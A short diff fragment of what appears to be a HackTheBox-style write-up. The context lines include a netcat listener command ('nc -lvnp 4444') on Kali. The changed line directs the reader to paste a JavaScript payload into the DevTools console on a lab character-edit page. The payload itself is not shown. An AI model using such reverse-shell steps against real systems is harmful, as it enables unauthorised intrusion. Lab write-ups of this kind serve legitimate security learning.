@@ -80,7 +80,7 @@ Start a listener on Kali:
 nc -lvnp 4444
 ```
 
-Then in Console (same block, swap the payload):
+Then in Console At `http://dzcampaigns.htb/character/15/edit` → DevTools → Console::
 
 javascript
 
